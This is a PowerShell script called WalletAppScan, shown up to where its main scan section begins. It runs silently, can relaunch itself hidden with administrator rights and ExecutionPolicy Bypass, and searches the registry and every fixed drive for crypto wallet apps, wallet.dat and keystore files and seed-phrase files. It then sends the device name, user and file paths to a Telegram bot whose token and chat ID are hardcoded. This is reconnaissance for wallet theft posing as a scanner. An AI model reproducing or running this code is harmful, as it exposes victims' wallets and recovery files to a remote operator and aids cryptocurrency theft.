#requires -Version 5.1
<# =====================================================================
    WalletAppScan v1.0
    One-shot crypto wallet desktop-application finder (single file, no Python)

    WHAT IT DOES (one run, one Telegram report):
      1) Scans the installed-programs registry (machine + every user hive)
         for known crypto wallet desktop applications.
      2) Sweeps every fixed drive on the device (bounded depth) for
         wallet application folders, wallet data folders and wallet data
         files (wallet.dat, keystore, *.wallet ...). Never opens a wallet
         file - paths and metadata only.
      3) Searches user profiles for seed / recovery-phrase candidate files
         (file NAME and path only - content is never read).
      4) Sorts everything by category (hardware suites -> desktop wallets ->
         node clients -> exchange apps -> wallet data -> seed candidates)
         and sends ONE consolidated report to Telegram with device name,
         versions, publishers, install paths and file paths.

    RUN (default, no switches):  powershell -File .\WalletAppScan.ps1
    SWITCHES:
      -ConfigPath <file>  load an external JSON config over the embedded one
      -Elevate            relaunch itself as Administrator (hidden) if needed
      -Console            show progress on screen
      -TestNotify         send a Telegram test message and exit
      -NoNotify           scan but do not send anything
      -Help               show this help

    SELF-TEST / OVERRIDES (not needed on a real Windows machine):
      WM_SCAN_ROOTS      semicolon-separated list of roots that replaces
                         the automatic fixed-drive detection
      WM_USERS_ROOT      replaces C:\Users for user-profile detection
      WALLETSCAN_BOT_TOKEN / WALLETSCAN_CHAT_ID   Telegram overrides
      WALLETMON_BOT_TOKEN / WALLETMON_CHAT_ID     also accepted
   ===================================================================== #>

param(
    [string]$ConfigPath = '',
    [switch]$Console,
    [switch]$Elevate,
    [switch]$NoNotify,
    [switch]$TestNotify,
    [switch]$Help
)

$ErrorActionPreference = 'Stop'
try {
    [System.Net.ServicePointManager]::SecurityProtocol = `
        [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11
} catch { }

# ---- Silent mode: nothing on screen unless -Console / -Help ----------
$Script:ConsoleMode = [bool]($Console -or $TestNotify -or $Help)
if (-not $Script:ConsoleMode) { $ErrorActionPreference = 'SilentlyContinue' }

# =====================================================================
#  1)  Embedded config (edit here directly - everything in one place)
# =====================================================================

$CONFIG = @{
    telegram = @{
        bot_token     = '8902859155:AAGRUoe01trA02q0Ze21P8SkgbdeSiRranM'
        chat_id       = '1183685158'
        rate_limit_ms = 400
    }

    scan = @{
        roots        = @('*AUTO*')   # *AUTO* = every fixed drive on the device
        max_depth    = 7             # levels below each drive root
        max_items    = 300000        # safety bound for the sweep
        max_results  = 400           # safety bound for matches
        exclude_dirs = @(
            'WinSxS', 'SoftwareDistribution', 'DriverStore', 'servicing',
            '$RECYCLE.BIN', 'System Volume Information', 'node_modules',
            '.git', '.svn', 'Temp', 'tmp', 'Cache', 'Code Cache', 'GPUCache',
            'ShaderCache', 'GrShaderCache', 'Crashpad', 'BrowserMetrics',
            'Installer', 'Packages', 'WindowsApps', 'Windows', 'Microsoft',
            'OneDrive', 'OneDriveTemp', 'Recovery', 'InetCache', 'WebCache'
        )
    }

    report = @{
        max_message_chars = 3500
    }

    paths = @{
        log_file = 'wallet-app-scan.log'
    }
}

# =====================================================================
#  2)  Catalog: known desktop wallet applications (category -> names)
#      Matching against program names is substring-based, case-insensitive.
#      Category order = report order.
# =====================================================================

$Script:AppCatalog = @(
    @{ cat = 'Hardware wallet suite'; names = @(
        'Ledger Live', 'Ledger', 'Trezor Suite', 'Trezor Bridge', 'Trezor',
        'BitBox', 'OneKey', 'SafePal', 'CoolWallet', 'Ellipal', 'Keystone') }
    @{ cat = 'Desktop wallet'; names = @(
        'Exodus', 'Electrum', 'Electron Cash', 'Atomic Wallet', 'AtomicWallet',
        'Guarda', 'Coinomi', 'Jaxx', 'MyCrypto', 'Sparrow', 'Specter',
        'Nunchuk', 'Wasabi', 'Samourai', 'Mycelium', 'Frame Wallet',
        'Infinity Wallet', 'BlueWallet', 'Phantom Wallet', 'Rabby',
        'Ronin Wallet', 'MetaMask', 'Solflare Wallet', 'Backpack Wallet',
        'Coinbase Wallet', 'Trust Wallet', 'Petra Wallet', 'Xaman',
        'MyEtherWallet', 'Coinomi Wallet') }
    @{ cat = 'Node / core client'; names = @(
        'Bitcoin Core', 'Litecoin Core', 'Dash Core', 'Dogecoin Core',
        'Bitcoin Knots', 'Monero GUI', 'Monero', 'Zcash', 'Daedalus',
        'Yoroi', 'Armory', 'Ethereum Wallet', 'Bitcoin-Qt') }
    @{ cat = 'Exchange desktop app'; names = @(
        'Binance', 'KuCoin', 'Bybit', 'OKX', 'Bitget', 'Kraken') }
)

# Folder-name keywords for the drive sweep (substring, case-insensitive)
$Script:DirKeywords = @(
    'exodus', 'electrum', 'electron cash', 'electron-cash', 'ledger',
    'trezor', 'bitbox', 'onekey', 'safepal', 'coolwallet', 'ellipal',
    'keystone', 'atomic wallet', 'atomicwallet', 'guarda', 'coinomi',
    'jaxx', 'mycrypto', 'myetherwallet', 'sparrow', 'specter', 'nunchuk',
    'wasabi', 'samourai', 'mycelium', 'frame wallet', 'infinity wallet',
    'bluewallet', 'phantom wallet', 'rabby', 'ronin wallet', 'metamask',
    'solflare', 'backpack wallet', 'coinbase wallet', 'trust wallet',
    'petra wallet', 'bitcoin', 'litecoin', 'dogecoin', 'dashcore',
    'dash core', 'monero', 'zcash', 'daedalus', 'yoroi', 'keystore',
    'exodus.wallet'
)

# Wallet data files (wildcards allowed). Path + size + modified only - never opened.
$Script:WalletFilePatterns = @(
    'wallet.dat', 'walletbackup', 'wallet_backup', 'wallet-backup',
    'default_wallet', '*.wallet', '*.walletdat', '*.keystore',
    'keystore', 'UTC--*'
)

# Seed / recovery-phrase candidate files (file NAME + path only, never content)
$Script:SeedFilePatterns = @(
    '*seed*phrase*', '*seed*words*', '*seed*backup*', '*mnemonic*',
    '*bip39*', '*recovery*phrase*', '*recovery*words*'
)

# =====================================================================
#  3)  Base paths + device identity
# =====================================================================

$Script:ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
if (-not $Script:ScriptDir) { $Script:ScriptDir = (Get-Location).Path }

$Script:ConfigFile = ''
if ($ConfigPath) {
    if (-not [System.IO.Path]::IsPathRooted($ConfigPath)) { $ConfigPath = Join-Path $Script:ScriptDir $ConfigPath }
    $Script:ConfigFile = [System.IO.Path]::GetFullPath($ConfigPath)
}

$Script:HostLabel = $env:COMPUTERNAME
if ([string]::IsNullOrWhiteSpace($Script:HostLabel)) {
    try { $Script:HostLabel = [System.Net.Dns]::GetHostName() } catch { $Script:HostLabel = '' }
}
if ([string]::IsNullOrWhiteSpace($Script:HostLabel)) { $Script:HostLabel = 'UnknownHost' }

function Get-OSLabel {
    try {
        $cv = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -ErrorAction Stop
        $pn = [string]$cv.ProductName
        $dv = [string]$cv.DisplayVersion
        if ($pn) { if ($dv) { return "$pn $dv" } else { return $pn } }
    } catch { }
    try { return [System.Environment]::OSVersion.VersionString } catch { return '' }
}
$Script:OSLabel = Get-OSLabel

$Script:DeviceLine = $Script:HostLabel
if ($Script:OSLabel) { $Script:DeviceLine = "$($Script:HostLabel) - $($Script:OSLabel)" }

$Script:LogPath = Join-Path $Script:ScriptDir 'wallet-app-scan.log'   # may be overridden by the config (see Main)

# Collectors
$Script:Apps      = New-Object System.Collections.ArrayList   # installed apps (registry)
$Script:Folders   = New-Object System.Collections.ArrayList   # wallet folders found on disk
$Script:DataFiles = New-Object System.Collections.ArrayList   # wallet data files
$Script:Seeds     = New-Object System.Collections.ArrayList   # seed / recovery phrase candidates
$Script:RunErrors = New-Object System.Collections.ArrayList
$Script:SeenPaths = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
$Script:Visited   = 0
$Script:RootsUsed = @()

# =====================================================================
#  4)  Helpers
# =====================================================================

function Get-Prop {
    param($Object, [string]$Name, $Default = $null)
    if ($null -eq $Object) { return $Default }
    if ($Object -is [System.Collections.IDictionary]) {
        if (-not $Object.Contains($Name)) { return $Default }
        $v = $Object[$Name]
        if ($null -eq $v) { return $Default }
        return $v
    }
    $p = $Object.PSObject.Properties[$Name]
    if ($null -eq $p) { return $Default }
    if ($null -eq $p.Value) { return $Default }
    return $p.Value
}

function Merge-Config {
    param($Base, $Over)
    if ($null -eq $Over) { return }
    if ($Over -is [System.Collections.IDictionary]) {
        foreach ($k in @($Over.Keys)) {
            if ($Base.Contains($k) -and ($Base[$k] -is [System.Collections.IDictionary]) -and ($Over[$k] -is [System.Collections.IDictionary])) {
                Merge-Config $Base[$k] $Over[$k]
            } else {
                $Base[$k] = $Over[$k]
            }
        }
        return
    }
    foreach ($p in $Over.PSObject.Properties) {
        $Base[$p.Name] = $p.Value
    }
}

function Read-JsonFile {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { throw "File not found: $Path" }
    $raw = [System.IO.File]::ReadAllText($Path)
    return ($raw | ConvertFrom-Json)
}

function ConvertTo-HtmlSafe {
    param([string]$Text)
    if ([string]::IsNullOrEmpty($Text)) { return '' }
    $t = $Text -replace '&', '&amp;'
    $t = $t -replace '<', '&lt;'
    $t = $t -replace '>', '&gt;'
    return $t
}

function Limit-Text {
    param([string]$Text, [int]$Max = 200)
    if ([string]::IsNullOrEmpty($Text)) { return '' }
    $t = $Text.Trim()
    if ($t.Length -le $Max) { return $t }
    return $t.Substring(0, [Math]::Max(1, $Max - 3)) + '...'
}

function Write-Console {
    param([string]$Text, [string]$Color = 'Gray')
    if ($Script:ConsoleMode) { try { Write-Host $Text -ForegroundColor $Color } catch { }
    }
}

function Write-Log {
    param([string]$Text, [string]$Level = 'INFO')
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Text"
    try {
        if ((Test-Path -LiteralPath $Script:LogPath)) {
            $fi = Get-Item -LiteralPath $Script:LogPath -ErrorAction Stop
            if ($fi.Length -gt 5242880) { Remove-Item -LiteralPath $Script:LogPath -Force -ErrorAction SilentlyContinue }
        }
        Add-Content -LiteralPath $Script:LogPath -Value $line -ErrorAction SilentlyContinue
    } catch { }
}

function Test-IsAdmin {
    try {
        $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $pr = New-Object System.Security.Principal.WindowsPrincipal($id)
        return $pr.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { return $true }   # non-Windows test context: never block
}

function Split-MessageChunks {
    param([string[]]$Lines, [int]$MaxChars = 3500)
    $chunks = New-Object System.Collections.ArrayList
    if ($null -eq $Lines -or @($Lines).Count -eq 0) { return @() }
    $cur = New-Object System.Text.StringBuilder
    foreach ($ln in $Lines) {
        $add = "$ln`n"
        if ($cur.Length -gt 0 -and ($cur.Length + $add.Length) -gt $MaxChars) {
            [void]$chunks.Add($cur.ToString().TrimEnd("`n"))
            $cur = New-Object System.Text.StringBuilder
        }
        [void]$cur.Append($add)
    }
    if ($cur.Length -gt 0) { [void]$chunks.Add($cur.ToString().TrimEnd("`n")) }
    return @($chunks)
}

function Test-NameMatch {
    param([string]$Name, [string[]]$Patterns)
    foreach ($p in $Patterns) {
        if (-not $p) { continue }
        if ($Name -like $p) { return $p }
    }
    return $null
}

function Get-MatchedKeyword {
    param([string]$Text, [string[]]$Keywords)
    foreach ($k in $Keywords) {
        if (-not $k) { continue }
        if ($Text -and $Text.ToLowerInvariant().Contains($k.ToLowerInvariant())) { return $k }
    }
    return $null
}

function Get-AppCategory {
    <# Returns the first catalog entry whose names match the program name. #>
    param([string]$Text)
    foreach ($entry in $Script:AppCatalog) {
        $kw = Get-MatchedKeyword -Text $Text -Keywords $entry.names
        if ($kw) { return @{ cat = $entry.cat; kw = $kw } }
    }
    return $null
}

function Get-UserForPath {
    <# Returns the profile name when the path is inside a real user profile. #>
    param([string]$Path)
    foreach ($p in $Script:UserProfiles) {
        if ($Path.StartsWith($p.Root, [System.StringComparison]::OrdinalIgnoreCase)) { return $p.Name }
    }
    return ''
}

function Add-Error {
    param([string]$Text)
    [void]$Script:RunErrors.Add($Text)
    Write-Log $Text 'ERROR'
}

# =====================================================================
#  5)  Telegram
# =====================================================================

function Initialize-Telegram {
    $tg = Get-Prop $Script:Cfg 'telegram' $null
    $Script:BotToken = [string](Get-Prop $tg 'bot_token' '')
    $Script:ChatId   = [string](Get-Prop $tg 'chat_id' '')
    if ($env:WALLETSCAN_BOT_TOKEN) { $Script:BotToken = $env:WALLETSCAN_BOT_TOKEN }
    if ($env:WALLETSCAN_CHAT_ID)   { $Script:ChatId   = $env:WALLETSCAN_CHAT_ID }
    if (-not $Script:BotToken -and $env:WALLETMON_BOT_TOKEN) { $Script:BotToken = $env:WALLETMON_BOT_TOKEN }
    if (-not $Script:ChatId -and $env:WALLETMON_CHAT_ID)     { $Script:ChatId   = $env:WALLETMON_CHAT_ID }
    $Script:RateLimitMs = [int](Get-Prop $tg 'rate_limit_ms' 400)

    if ([string]::IsNullOrWhiteSpace($Script:BotToken) -or $Script:BotToken -like 'PUT_YOUR*') {
        Write-Log 'bot_token is not set. Notifications are disabled.' 'WARN'
        $Script:BotToken = ''
    }
    if ([string]::IsNullOrWhiteSpace($Script:ChatId) -or $Script:ChatId -like 'PUT_YOUR*') {
        Write-Log 'chat_id is not set. Notifications are disabled.' 'WARN'
        $Script:ChatId = ''
    }
}

function Send-TelegramMessage {
    <# Sends a single message. Returns $true/$false. Never logs the token. #>
    param([string]$Text)

    if ($NoNotify) { return $false }
    if (-not $Script:BotToken -or -not $Script:ChatId) { return $false }

    $body = @{
        chat_id                  = $Script:ChatId
        text                     = $Text
        parse_mode               = 'HTML'
        disable_web_page_preview = $true
    }
    $url = "https://api.telegram.org/bot$($Script:BotToken)/sendMessage"

    for ($attempt = 1; $attempt -le 3; $attempt++) {
        try {
            $resp = Invoke-RestMethod -Uri $url -Method Post -Body $body -TimeoutSec 25 -ErrorAction Stop
            if ($resp.ok) {
                if ($Script:RateLimitMs -gt 0) { Start-Sleep -Milliseconds $Script:RateLimitMs }
                return $true
            }
            Write-Log "Telegram rejected the message: $($resp.description)" 'ERROR'
            return $false
        } catch {
            if ($attempt -lt 3) { Start-Sleep -Seconds (2 * $attempt); continue }
            Write-Log "Failed to send Telegram notification after 3 attempts: $($_.Exception.Message)" 'ERROR'
            return $false
        }
    }
    return $false
}

function Send-ReportChunks {
    <# Sends the report as consecutive chunks; every chunk carries the device line. #>
    param([string[]]$Lines)
    $maxChars = [int](Get-Prop (Get-Prop $Script:Cfg 'report') 'max_message_chars' 3500)
    $chunks = Split-MessageChunks -Lines $Lines -MaxChars $maxChars
    $total = @($chunks).Count
    if ($total -eq 0) { return 0 }
    $dev = "🖥 Device: <b>$(ConvertTo-HtmlSafe $Script:DeviceLine)</b>"
    $sent = 0
    for ($i = 0; $i -lt $total; $i++) {
        $txt = @($chunks)[$i]
        if ($i -eq 0) {
            $txt = "$dev`n$txt"
        } else {
            $txt = "$dev`n📄 (part $($i + 1)/$total)`n$txt"
        }
        if (Send-TelegramMessage -Text $txt) { $sent++ }
    }
    return $sent
}

# =====================================================================
#  6)  Scan roots + user profiles
# =====================================================================

function Get-ScanRoots {
    <# Every fixed drive on the device; WM_SCAN_ROOTS overrides (self-test). #>
    $roots = @()

    if ($env:WM_SCAN_ROOTS) {
        foreach ($r in ($env:WM_SCAN_ROOTS -split ';')) {
            $r = $r.Trim()
            if ($r) { $roots += $r }
        }
        return @($roots | Select-Object -Unique)
    }

    $cfgRoots = @(Get-Prop (Get-Prop $Script:Cfg 'scan') 'roots' @('*AUTO*'))
    if ($cfgRoots.Count -gt 0 -and $cfgRoots[0] -ne '*AUTO*') {
        foreach ($r in $cfgRoots) {
            $r = [string]$r
            if (-not $r) { continue }
            $exp = [System.Environment]::ExpandEnvironmentVariables($r)
            if (Test-Path -LiteralPath $exp) { $roots += $exp }
        }
        return @($roots | Select-Object -Unique)
    }

    try {
        $drives = @(Get-CimInstance -ClassName Win32_LogicalDisk -Filter 'DriveType=3' -ErrorAction Stop)
        foreach ($d in $drives) {
            $p = "$($d.DeviceID)\"
            if (Test-Path -LiteralPath $p) { $roots += $p }
        }
    } catch { }
    if ($roots.Count -eq 0) { if (Test-Path -LiteralPath 'C:\') { $roots += 'C:\' } }
    return @($roots | Select-Object -Unique)
}

function Get-RealUserProfiles {
    $root = $env:WM_USERS_ROOT
    if ([string]::IsNullOrWhiteSpace($root)) { $root = 'C:\Users' }
    $skip = @('Public', 'Default', 'Default User', 'All Users', 'Public Documents')
    $profiles = @()
    if (-not (Test-Path -LiteralPath $root)) { return @() }
    foreach ($d in @(Get-ChildItem -LiteralPath $root -Directory -Force -ErrorAction SilentlyContinue)) {
        if ($skip -notcontains $d.Name) { $profiles += [PSCustomObject]@{ Name = $d.Name; Root = $d.FullName } }
    }
    return @($profiles)
}

# =====================================================================
#  7)  Scan 1: installed programs (registry)
# =====================================================================

function Invoke-RegistryAppScan {
    if (-not (Get-PSProvider -PSProvider Registry -ErrorAction SilentlyContinue)) {
        Write-Log 'Registry provider unavailable - installed-programs scan skipped.' 'DEBUG'
        return
    }
    Write-Log 'Scanning installed programs (registry)...'
    $paths = @(
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    try {
        $hkuSids = @(Get-ChildItem -Path 'Registry::HKEY_USERS' -ErrorAction SilentlyContinue |
            Where-Object { $_.PSChildName -like 'S-1-5-21-*' })
        foreach ($sid in $hkuSids) {
            $paths += ('Registry::HKEY_USERS\' + $sid.PSChildName + '\Software\Microsoft\Windows\CurrentVersion\Uninstall\*')
        }
    } catch { }

    $seen = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
    foreach ($p in $paths) {
        try { $items = @(Get-ItemProperty -Path $p -ErrorAction Stop) }
        catch {
            if ($p -like 'Registry::HKEY_USERS*') { Write-Log "Skipped registry path '$p' (not readable)." 'DEBUG' }
            else { Add-Error "Could not read registry path '$p': $($_.Exception.Message)" }
            continue
        }
        foreach ($it in $items) {
            $dn = [string](Get-Prop $it 'DisplayName' '')
            if ([string]::IsNullOrWhiteSpace($dn)) { continue }

            $m = Get-AppCategory -Text $dn
            if (-not $m) { continue }

            $ver  = [string](Get-Prop $it 'DisplayVersion' '')
            $date = [string](Get-Prop $it 'InstallDate' '')
            $loc  = [string](Get-Prop $it 'InstallLocation' '')
            $pub  = [string](Get-Prop $it 'Publisher' '')
            if ($date -match '^(\d{4})(\d{2})(\d{2})$') { $date = "$($Matches[1])-$($Matches[2])-$($Matches[3])" }

            $key = "$dn|$ver|$loc"
            if ($seen.Contains($key)) { continue }
            [void]$seen.Add($key)

            [void]$Script:Apps.Add([PSCustomObject]@{
                Category = $m.cat; Match = $m.kw; Name = $dn; Version = $ver
                Publisher = $pub; Date = $date; Location = $loc
            })
            Write-Log "Installed wallet app: $dn $ver [$($m.cat)]"
        }
    }
    Write-Log "Installed wallet apps found: $($Script:Apps.Count)"
}

# =====================================================================
#  8)  Scan 2: drive sweep (folders + wallet data files + seed candidates)
# =====================================================================

function Invoke-DriveSweep {
    $scanCfg    = Get-Prop $Script:Cfg 'scan' $null
    $maxDepth   = [int](Get-Prop $scanCfg 'max_depth' 7)
    $maxItems   = [int](Get-Prop $scanCfg 'max_items' 300000)
    $maxResults = [int](Get-Prop $scanCfg 'max_results' 400)
    $excludeDirs = @(Get-Prop $scanCfg 'exclude_dirs' @())

    $results = 0
    foreach ($root in $Script:RootsUsed) {
        Write-Log "Sweeping root: $root (depth $maxDepth)"
        $stack = New-Object System.Collections.Stack
        $stack.Push([PSCustomObject]@{ Path = $root; Depth = 0 })

        while ($stack.Count -gt 0) {
            $cur = $stack.Pop()
            $curPath = [string]$cur.Path
            $curDepth = [int]$cur.Depth

            if ($Script:Visited -ge $maxItems) { Write-Log "Reached the item limit ($maxItems); sweep stopped." 'WARN'; break }
            if ($results -ge $maxResults) { Write-Log "Reached the result limit ($maxResults); sweep stopped." 'WARN'; break }

            $entries = $null
            try { $entries = @(Get-ChildItem -LiteralPath $curPath -Force -ErrorAction Stop) }
            catch { continue }

            foreach ($e in $entries) {
                $Script:Visited++
                if ($Script:Visited -ge $maxItems) { break }
                if ($results -ge $maxResults) { break }

                $full = [string]$e.FullName
                if ($e.PSIsContainer) {
                    if ($excludeDirs -contains $e.Name) { continue }
                    $kw = Get-MatchedKeyword -Text $e.Name -Keywords $Script:DirKeywords
                    if ($kw -and -not $Script:SeenPaths.Contains($full)) {
                        [void]$Script:SeenPaths.Add($full)
                        $cat = ''
                        $m = Get-AppCategory -Text $e.Name
                        if ($m) { $cat = $m.cat } else { $cat = 'Wallet data folder' }
                        [void]$Script:Folders.Add([PSCustomObject]@{
                            Name = $e.Name; Path = $full; Category = $cat
                            Match = $kw; Modified = $e.LastWriteTime
                        })
                        $results++
                        Write-Log "Wallet folder: $full"
                    }
                    if ($curDepth -lt $maxDepth) { $stack.Push([PSCustomObject]@{ Path = $full; Depth = $curDepth + 1 }) }
                } else {
                    $pat = Test-NameMatch -Name $e.Name -Patterns $Script:WalletFilePatterns
                    $seed = $null
                    if (-not $pat) { $seed = Test-NameMatch -Name $e.Name -Patterns $Script:SeedFilePatterns }
                    if (-not $pat -and -not $seed) { continue }
                    if ($Script:SeenPaths.Contains($full)) { continue }
                    [void]$Script:SeenPaths.Add($full)

                    $sizeTxt = '-'
                    try { $sizeTxt = '{0:N0} bytes' -f $e.Length } catch { }
                    $modTxt = 'unknown'
                    try { $modTxt = $e.LastWriteTime.ToString('yyyy-MM-dd HH:mm') } catch { }
                    $user = Get-UserForPath -Path $full

                    if ($pat) {
                        [void]$Script:DataFiles.Add([PSCustomObject]@{
                            Name = $e.Name; Path = $full; User = $user
                            Size = $sizeTxt; Modified = $modTxt; Match = $pat
                        })
                        Write-Log "Wallet data file: $full"
                    } else {
                        [void]$Script:Seeds.Add([PSCustomObject]@{
                            Name = $e.Name; Path = $full; User = $user
                            Size = $sizeTxt; Modified = $modTxt
                        })
                        Write-Log "Seed candidate file: $full"
                    }
                    $results++
                }
            }
        }
    }
    Write-Log "Sweep finished: $($Script:Visited) items visited, folders: $($Script:Folders.Count), data files: $($Script:DataFiles.Count), seed candidates: $($Script:Seeds.Count)"
}

# =====================================================================
#  9)  Report builder (sorted)
# =====================================================================

function Get-CategoryOrder {
    param([string]$Cat)
    $order = @('Hardware wallet suite', 'Desktop wallet', 'Node / core client', 'Exchange desktop app', 'Wallet data folder', 'Other')
    $i = [array]::IndexOf($order, $Cat)
    if ($i -lt 0) { $i = $order.Count - 1 }
    return $i
}

function Build-ReportLines {
    $lines = New-Object System.Collections.ArrayList
    $sep = '━━━━━━━━━━━━━━━━'

    [void]$lines.Add('🪙 <b>Crypto wallet application report</b>')
    [void]$lines.Add($sep)
    [void]$lines.Add("👤 Running as: $(ConvertTo-HtmlSafe ([string]$env:USERNAME))")
    [void]$lines.Add("🕒 $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
    $total = $Script:Apps.Count + $Script:Folders.Count + $Script:DataFiles.Count + $Script:Seeds.Count
    [void]$lines.Add("📊 Results: <b>$total</b> — apps: $($Script:Apps.Count) · folders: $($Script:Folders.Count) · data files: $($Script:DataFiles.Count) · seed candidates: $($Script:Seeds.Count)")

    if ($total -eq 0) {
        [void]$lines.Add('')
        [void]$lines.Add('✅ No crypto wallet applications, wallet data files or seed-phrase candidates were found on this device.')
    }

    # ---- Section 1: installed applications (category, then name) ----
    if ($Script:Apps.Count -gt 0) {
        [void]$lines.Add('')
        [void]$lines.Add("🔷 <b>Installed wallet applications</b> ($($Script:Apps.Count))")
        [void]$lines.Add($sep)
        $sorted = @($Script:Apps | Sort-Object @{ Expression = { Get-CategoryOrder $_.Category } }, @{ Expression = 'Name' })
        foreach ($a in $sorted) {
            $verTxt = ''
            if ($a.Version) { $verTxt = " $(ConvertTo-HtmlSafe (Limit-Text $a.Version 30))" }
            [void]$lines.Add("▪ <b>$(ConvertTo-HtmlSafe (Limit-Text $a.Name 90))</b>$verTxt — $(ConvertTo-HtmlSafe $a.Category)")
            if ($a.Location) { [void]$lines.Add("   📁 <code>$(ConvertTo-HtmlSafe (Limit-Text $a.Location 180))</code>") }
            $meta = @()
            if ($a.Publisher) { $meta += "🏢 $(ConvertTo-HtmlSafe (Limit-Text $a.Publisher 60))" }
            if ($a.Date) { $meta += "📅 $(ConvertTo-HtmlSafe $a.Date)" }
            if ($meta.Count -gt 0) { [void]$lines.Add("   $($meta -join ' · ')") }
        }
    }

    # ---- Section 2: wallet folders found on disk ----
    if ($Script:Folders.Count -gt 0) {
        [void]$lines.Add('')
        [void]$lines.Add("📁 <b>Wallet folders on disk</b> ($($Script:Folders.Count))")
        [void]$lines.Add($sep)
        $sorted = @($Script:Folders | Sort-Object @{ Expression = { Get-CategoryOrder $_.Category } }, @{ Expression = 'Name' }, @{ Expression = 'Path' })
        foreach ($f in $sorted) {
            [void]$lines.Add("▪ <b>$(ConvertTo-HtmlSafe (Limit-Text $f.Name 90))</b> — $(ConvertTo-HtmlSafe $f.Category)")
            [void]$lines.Add("   <code>$(ConvertTo-HtmlSafe (Limit-Text $f.Path 200))</code>")
        }
    }

    # ---- Section 3: wallet data files ----
    if ($Script:DataFiles.Count -gt 0) {
        [void]$lines.Add('')
        [void]$lines.Add("💾 <b>Wallet data files</b> ($($Script:DataFiles.Count)) — paths and metadata only")
        [void]$lines.Add($sep)
        $sorted = @($Script:DataFiles | Sort-Object @{ Expression = 'User' }, @{ Expression = 'Name' }, @{ Expression = 'Path' })
        foreach ($d in $sorted) {
            $userTxt = ''
            if ($d.User) { $userTxt = " · 👤 $(ConvertTo-HtmlSafe $d.User)" }
            [void]$lines.Add("▪ <b>$(ConvertTo-HtmlSafe (Limit-Text $d.Name 90))</b> · $($d.Size) · $($d.Modified)$userTxt")
            [void]$lines.Add("   <code>$(ConvertTo-HtmlSafe (Limit-Text $d.Path 200))</code>")
        }
    }

    # ---- Section 4: seed / recovery-phrase candidates ----
    if ($Script:Seeds.Count -gt 0) {
        [void]$lines.Add('')
        [void]$lines.Add("🔑 <b>Seed / recovery-phrase candidates</b> ($($Script:Seeds.Count)) — file names and paths only, content is never read")
        [void]$lines.Add($sep)
        $sorted = @($Script:Seeds | Sort-Object @{ Expression = 'User' }, @{ Expression = 'Name' })
        foreach ($s in $sorted) {
            $userTxt = ''
            if ($s.User) { $userTxt = " · 👤 $(ConvertTo-HtmlSafe $s.User)" }
            [void]$lines.Add("▪ <b>$(ConvertTo-HtmlSafe (Limit-Text $s.Name 90))</b> · $($s.Size)$userTxt")
            [void]$lines.Add("   <code>$(ConvertTo-HtmlSafe (Limit-Text $s.Path 200))</code>")
        }
    }

    # ---- Coverage + problems ----
    [void]$lines.Add('')
    $rootsTxt = (@($Script:RootsUsed) -join ', ')
    [void]$lines.Add("🔎 Coverage: $rootsTxt · $($Script:Visited) items scanned")
    if ($Script:RunErrors.Count -gt 0) {
        [void]$lines.Add("⚠ Scan problems: $($Script:RunErrors.Count)")
        foreach ($e in @($Script:RunErrors | Select-Object -First 5)) {
            [void]$lines.Add("   - $(ConvertTo-HtmlSafe (Limit-Text $e 180))")
        }
    }
    [void]$lines.Add('')
    [void]$lines.Add('WalletAppScan v1.0')
    return @($lines)
}

# =====================================================================
#  10)  Main
# =====================================================================

if ($Help) {
    $Script:ConsoleMode = $true
    Write-Host 'WalletAppScan v1.0 — one-shot crypto wallet desktop-application finder' -ForegroundColor Cyan
    Write-Host ''
    Write-Host '  (no switches)   scan the whole device and send ONE Telegram report'
    Write-Host '  -Elevate        relaunch itself as Administrator (hidden) if needed'
    Write-Host '  -Console        show progress on screen'
    Write-Host '  -TestNotify     send a Telegram test message and exit'
    Write-Host '  -NoNotify       scan but do not send anything'
    Write-Host '  -ConfigPath <f> load an external JSON config over the embedded one'
    exit 0
}

# ---- Optional external config ----
if ($Script:ConfigFile) {
    try {
        $ext = Read-JsonFile $Script:ConfigFile
        Merge-Config $CONFIG $ext
        Write-Console "Additional config loaded from: $($Script:ConfigFile)" 'Yellow'
    } catch {
        Write-Console "Warning: could not read the config file '$($Script:ConfigFile)' - $($_.Exception.Message)" 'Yellow'
    }
}
$Script:Cfg = $CONFIG

# Log-file name from the config (functions are defined by now)
$lfName = [string](Get-Prop (Get-Prop $Script:Cfg 'paths') 'log_file' '')
if ($lfName -and -not [System.IO.Path]::IsPathRooted($lfName)) {
    $Script:LogPath = Join-Path $Script:ScriptDir $lfName
}

Initialize-Telegram

# ---- Self-elevation (hidden) ----
if ($Elevate -and -not (Test-IsAdmin)) {
    $self = $PSCommandPath
    if (-not $self) { $self = $MyInvocation.MyCommand.Path }
    $argList = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $self + '"'
    if ($Script:ConfigFile) { $argList += ' -ConfigPath "' + $Script:ConfigFile + '"' }
    try {
        Start-Process powershell.exe -ArgumentList $argList -Verb RunAs -WindowStyle Hidden
        Write-Log 'Relaunched with Administrator rights (hidden window).'
        exit 0
    } catch {
        Write-Log "Elevation failed; continuing with current rights: $($_.Exception.Message)" 'WARN'
    }
}

# ---- Test notification ----
if ($TestNotify) {
    $msg = @()
    $msg += '✅ <b>WalletAppScan test notification</b>'
    $msg += '━━━━━━━━━━━━━━━━'
    $msg += "🖥 Device: <b>$(ConvertTo-HtmlSafe $Script:DeviceLine)</b>"
    $msg += 'Everything is configured correctly.'
    $ok = Send-TelegramMessage -Text ($msg -join "`n")
    if ($ok) { Write-Console 'Test message sent successfully.' 'Green' } else { Write-Console 'Test message FAILED - check bot_token / chat_id.' 'Red' }
    exit $(if ($ok) { 0 } else { 1 })
}

# ---- The scan ----
$scanStart = Get-Date
